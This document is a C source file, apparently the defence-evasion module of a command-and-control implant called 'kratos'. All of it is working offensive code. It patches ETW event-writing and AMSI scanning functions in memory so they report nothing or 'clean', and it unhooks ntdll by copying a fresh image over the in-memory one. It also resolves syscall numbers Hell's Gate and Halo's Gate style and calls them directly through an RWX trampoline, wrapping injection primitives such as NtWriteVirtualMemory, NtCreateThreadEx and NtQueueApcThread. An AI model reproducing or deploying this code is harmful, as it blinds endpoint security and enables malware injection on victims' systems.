#define _WIN32_WINNT 0x0600
#define WIN32_NO_STATUS
#include "evasion.h"
#include <windows.h>
#include <winnt.h>
#include <string.h>
#include <stdio.h>

/* ===================================================================
 * Shared helper: patch bytes with RW/RX toggle
 * ================================================================= */
static BOOL patch_bytes(LPVOID addr, const BYTE *src, SIZE_T len) {
    DWORD old = 0;
    if (!VirtualProtect(addr, len, PAGE_EXECUTE_READWRITE, &old)) return FALSE;
    memcpy(addr, src, len);
    VirtualProtect(addr, len, old, &old);
    FlushInstructionCache(GetCurrentProcess(), addr, len);
    return TRUE;
}

/* ===================================================================
 * 1. ETW PATCH
 *    xor rax,rax (48 33 C0) + ret (C3)  →  EtwEventWrite returns 0
 * ================================================================= */
#ifdef EVASION_ETW
static void patch_etw(void) {
    static const BYTE stub[] = { 0x48, 0x33, 0xC0, 0xC3 };
    HMODULE h = GetModuleHandleA("ntdll.dll");
    if (!h) return;
    const char *names[] = {
        "EtwEventWrite", "EtwEventWriteFull",
        "EtwEventWriteTransfer", "EtwEventRegister", NULL
    };
    for (int i = 0; names[i]; i++) {
        FARPROC fn = GetProcAddress(h, names[i]);
        if (fn) patch_bytes((LPVOID)fn, stub, sizeof(stub));
    }
}
#endif

/* ===================================================================
 * 2. AMSI PATCH
 *    mov eax, E_INVALIDARG (B8 57 00 07 80) + ret (C3)
 *    AmsiScanBuffer returns "clean" to any caller (PS, VBA, etc.)
 * ================================================================= */
#ifdef EVASION_AMSI
static void patch_amsi(void) {
    static const BYTE stub[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    HMODULE h = GetModuleHandleA("amsi.dll");
    if (!h) h = LoadLibraryA("amsi.dll");
    if (!h) return;
    const char *names[] = { "AmsiScanBuffer", "AmsiScanString", NULL };
    for (int i = 0; names[i]; i++) {
        FARPROC fn = GetProcAddress(h, names[i]);
        if (fn) patch_bytes((LPVOID)fn, stub, sizeof(stub));
    }
}
#endif

/* ===================================================================
 * 3. NTDLL UNHOOKING
 *    Map a fresh ntdll from disk (SEC_IMAGE), copy every executable
 *    read-only section over the hooked in-memory version.
 * ================================================================= */
#ifdef EVASION_UNHOOK
static void unhook_ntdll(void) {
    char path[MAX_PATH];
    GetSystemDirectoryA(path, sizeof(path));
    strncat(path, "\\ntdll.dll", sizeof(path) - strlen(path) - 1);

    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    CloseHandle(hFile);
    if (!hMap) return;

    LPVOID clean = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hMap);
    if (!clean) return;

    HMODULE hooked = GetModuleHandleA("ntdll.dll");
    if (!hooked) { UnmapViewOfFile(clean); return; }

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)clean;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((BYTE*)clean + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        /* Only copy executable non-writable sections (.text) */
        DWORD ch = sec->Characteristics;
        if (!(ch & IMAGE_SCN_MEM_EXECUTE)) continue;
        if (  ch & IMAGE_SCN_MEM_WRITE)    continue;

        LPVOID dst = (BYTE*)hooked + sec->VirtualAddress;
        LPVOID src = (BYTE*)clean  + sec->VirtualAddress;
        SIZE_T sz  = sec->Misc.VirtualSize;

        DWORD old = 0;
        if (VirtualProtect(dst, sz, PAGE_EXECUTE_WRITECOPY, &old)) {
            memcpy(dst, src, sz);
            VirtualProtect(dst, sz, old, &old);
            FlushInstructionCache(GetCurrentProcess(), dst, sz);
        }
    }
    UnmapViewOfFile(clean);
}
#endif

/* ===================================================================
 * 4. DIRECT SYSCALLS  (Hell's Gate + Halo's Gate)
 *
 *  Strategy:
 *   - Parse ntdll's EAT at runtime to find Nt* stubs.
 *   - A clean stub starts with:  4C 8B D1  B8 XX 00 00 00
 *                                mov r10,rcx  mov eax, SSN
 *   - If the stub is hooked (first bytes modified), walk neighboring
 *     exported Nt* functions (sorted by address) to infer the SSN
 *     (Halo's Gate: SSNs are contiguous for syscall-table functions).
 *   - Execute via a small RWX trampoline:
 *       4C 8B D1  B8 [SSN] 0F 05  C3
 * ================================================================= */
#ifdef EVASION_SYSCALLS

/* ---- EAT walker -------------------------------------------------- */
typedef struct { DWORD rva; DWORD idx; } ExportEntry;

/* Compare by RVA for qsort */
static int cmp_export(const void *a, const void *b) {
    return (int)((ExportEntry*)a)->rva - (int)((ExportEntry*)b)->rva;
}

DWORD kratos_resolve_ssn(const char *func_name) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return (DWORD)-1;

    BYTE *base = (BYTE*)hNtdll;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    DWORD eat_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!eat_rva) return (DWORD)-1;

    PIMAGE_EXPORT_DIRECTORY eat = (PIMAGE_EXPORT_DIRECTORY)(base + eat_rva);
    DWORD  *names   = (DWORD*) (base + eat->AddressOfNames);
    WORD   *ordinals= (WORD*)  (base + eat->AddressOfNameOrdinals);
    DWORD  *funcs   = (DWORD*) (base + eat->AddressOfFunctions);
    DWORD   n       = eat->NumberOfNames;

    /* Build sorted array of (RVA, ordinal) for Nt* functions */
    ExportEntry *nt_exports = (ExportEntry*)HeapAlloc(GetProcessHeap(), 0,
                                                       n * sizeof(ExportEntry));
    if (!nt_exports) return (DWORD)-1;

    DWORD nt_count = 0;
    for (DWORD i = 0; i < n; i++) {
        const char *name = (const char*)(base + names[i]);
        if (name[0] == 'N' && name[1] == 't') {
            nt_exports[nt_count].rva = funcs[ordinals[i]];
            nt_exports[nt_count].idx = i;
            nt_count++;
        }
    }

    /* Sort by function RVA → syscall table order */
    if (nt_count > 1) {
        /* Insertion sort (small array) */
        for (DWORD i = 1; i < nt_count; i++) {
            ExportEntry key = nt_exports[i];
            int j = (int)i - 1;
            while (j >= 0 && nt_exports[j].rva > key.rva) {
                nt_exports[j+1] = nt_exports[j]; j--;
            }
            nt_exports[j+1] = key;
        }
    }

    /* Find target function in sorted list */
    DWORD target_pos = (DWORD)-1;
    for (DWORD i = 0; i < nt_count; i++) {
        const char *name = (const char*)(base + names[nt_exports[i].idx]);
        if (strcmp(name, func_name) == 0) { target_pos = i; break; }
    }

    DWORD ssn = (DWORD)-1;
    if (target_pos != (DWORD)-1) {
        /* Hell's Gate: check if stub is clean */
        BYTE *stub = base + nt_exports[target_pos].rva;
        if (stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 &&
            stub[3] == 0xB8) {
            ssn = *(DWORD*)(stub + 4);  /* mov eax, SSN */
        } else {
            /* Halo's Gate: search up/down for unhooked neighbour */
            for (DWORD delta = 1; delta < nt_count; delta++) {
                /* try below */
                if (target_pos >= delta) {
                    BYTE *s = base + nt_exports[target_pos - delta].rva;
                    if (s[0]==0x4C && s[1]==0x8B && s[2]==0xD1 && s[3]==0xB8) {
                        ssn = *(DWORD*)(s + 4) + delta;
                        break;
                    }
                }
                /* try above */
                if (target_pos + delta < nt_count) {
                    BYTE *s = base + nt_exports[target_pos + delta].rva;
                    if (s[0]==0x4C && s[1]==0x8B && s[2]==0xD1 && s[3]==0xB8) {
                        ssn = *(DWORD*)(s + 4) - delta;
                        break;
                    }
                }
            }
        }
    }

    HeapFree(GetProcessHeap(), 0, nt_exports);
    return ssn;
}

/* ---- RWX syscall trampoline -------------------------------------- */
/*
 * Layout (12 bytes):
 *   4C 8B D1           mov r10, rcx
 *   B8 [ssn 4 bytes]   mov eax, SSN
 *   0F 05              syscall
 *   C3                 ret
 *
 * Thread-safety note: this stub is patched once per call while holding
 * no lock. Acceptable for a sequential C2 agent; add a spinlock if
 * multi-threaded use is needed.
 */
static BYTE *g_stub = NULL;

static BOOL init_stub(void) {
    if (g_stub) return TRUE;
    g_stub = (BYTE*)VirtualAlloc(NULL, 16,
                                 MEM_COMMIT | MEM_RESERVE,
                                 PAGE_EXECUTE_READWRITE);
    if (!g_stub) return FALSE;
    /* Fill invariant bytes */
    g_stub[0] = 0x4C; g_stub[1] = 0x8B; g_stub[2] = 0xD1; /* mov r10,rcx */
    g_stub[3] = 0xB8;                                        /* mov eax,    */
    /* [4..7] = SSN (patched per call)                                       */
    g_stub[8] = 0x0F; g_stub[9] = 0x05;                     /* syscall     */
    g_stub[10]= 0xC3;                                        /* ret         */
    return TRUE;
}

/* ---- Typed wrappers ---------------------------------------------- */

NTSTATUS kratos_NtAllocateVirtualMemory(HANDLE Process, PVOID *BaseAddress,
                                        ULONG_PTR ZeroBits, PSIZE_T RegionSize,
                                        ULONG AllocationType, ULONG Protect) {
    static DWORD ssn = (DWORD)-1;
    if (ssn == (DWORD)-1) ssn = kratos_resolve_ssn("NtAllocateVirtualMemory");
    if (!init_stub() || ssn == (DWORD)-1) return (NTSTATUS)0xC0000001;
    *(DWORD*)(g_stub + 4) = ssn;
    FlushInstructionCache(GetCurrentProcess(), g_stub, 11);
    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    return ((fn_t)g_stub)(Process, BaseAddress, ZeroBits, RegionSize,
                          AllocationType, Protect);
}

NTSTATUS kratos_NtProtectVirtualMemory(HANDLE Process, PVOID *BaseAddress,
                                       PSIZE_T RegionSize, ULONG NewProtect,
                                       PULONG OldProtect) {
    static DWORD ssn = (DWORD)-1;
    if (ssn == (DWORD)-1) ssn = kratos_resolve_ssn("NtProtectVirtualMemory");
    if (!init_stub() || ssn == (DWORD)-1) return (NTSTATUS)0xC0000001;
    *(DWORD*)(g_stub + 4) = ssn;
    FlushInstructionCache(GetCurrentProcess(), g_stub, 11);
    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
    return ((fn_t)g_stub)(Process, BaseAddress, RegionSize, NewProtect, OldProtect);
}

NTSTATUS kratos_NtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess,
                                 PVOID ObjectAttributes, HANDLE ProcessHandle,
                                 PVOID StartRoutine, PVOID Argument,
                                 ULONG CreateFlags, SIZE_T ZeroBits,
                                 SIZE_T StackSize, SIZE_T MaximumStackSize,
                                 PVOID AttributeList) {
    static DWORD ssn = (DWORD)-1;
    if (ssn == (DWORD)-1) ssn = kratos_resolve_ssn("NtCreateThreadEx");
    if (!init_stub() || ssn == (DWORD)-1) return (NTSTATUS)0xC0000001;
    *(DWORD*)(g_stub + 4) = ssn;
    FlushInstructionCache(GetCurrentProcess(), g_stub, 11);
    typedef NTSTATUS (NTAPI *fn_t)(PHANDLE, ACCESS_MASK, PVOID, HANDLE,
                                   PVOID, PVOID, ULONG, SIZE_T, SIZE_T,
                                   SIZE_T, PVOID);
    return ((fn_t)g_stub)(ThreadHandle, DesiredAccess, ObjectAttributes,
                          ProcessHandle, StartRoutine, Argument, CreateFlags,
                          ZeroBits, StackSize, MaximumStackSize, AttributeList);
}

NTSTATUS kratos_NtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
                                     PVOID Buffer, SIZE_T NumberOfBytesToWrite,
                                     PSIZE_T NumberOfBytesWritten) {
    static DWORD ssn = (DWORD)-1;
    if (ssn == (DWORD)-1) ssn = kratos_resolve_ssn("NtWriteVirtualMemory");
    if (!init_stub() || ssn == (DWORD)-1) return (NTSTATUS)0xC0000001;
    *(DWORD*)(g_stub + 4) = ssn;
    FlushInstructionCache(GetCurrentProcess(), g_stub, 11);
    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    return ((fn_t)g_stub)(ProcessHandle, BaseAddress, Buffer,
                          NumberOfBytesToWrite, NumberOfBytesWritten);
}

NTSTATUS kratos_NtQueueApcThread(HANDLE ThreadHandle, PVOID ApcRoutine,
                                  PVOID ApcArgument1, PVOID ApcArgument2,
                                  PVOID ApcArgument3) {
    static DWORD ssn = (DWORD)-1;
    if (ssn == (DWORD)-1) ssn = kratos_resolve_ssn("NtQueueApcThread");
    if (!init_stub() || ssn == (DWORD)-1) return (NTSTATUS)0xC0000001;
    *(DWORD*)(g_stub + 4) = ssn;
    FlushInstructionCache(GetCurrentProcess(), g_stub, 11);
    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PVOID, PVOID, PVOID, PVOID);
    return ((fn_t)g_stub)(ThreadHandle, ApcRoutine, ApcArgument1,
                          ApcArgument2, ApcArgument3);
}

static void init_syscalls(void) {
    /* Pre-resolve SSNs while ntdll is still accessible.
     * Calling each resolver once caches the SSN in the static local. */
    kratos_resolve_ssn("NtAllocateVirtualMemory");
    kratos_resolve_ssn("NtProtectVirtualMemory");
    kratos_resolve_ssn("NtCreateThreadEx");
    kratos_resolve_ssn("NtWriteVirtualMemory");
    kratos_resolve_ssn("NtQueueApcThread");
}
#endif /* EVASION_SYSCALLS */

/* ===================================================================
 * Public entry point
 * ================================================================= */
void kratos_evasion_init(void) {
#ifdef EVASION_UNHOOK
    unhook_ntdll();   /* first: remove hooks so patches land on clean stubs */
#endif
#ifdef EVASION_ETW
    patch_etw();
#endif
#ifdef EVASION_AMSI
    patch_amsi();
#endif
#ifdef EVASION_SYSCALLS
    init_syscalls();  /* resolve + cache SSNs while ntdll is accessible */
#endif
}
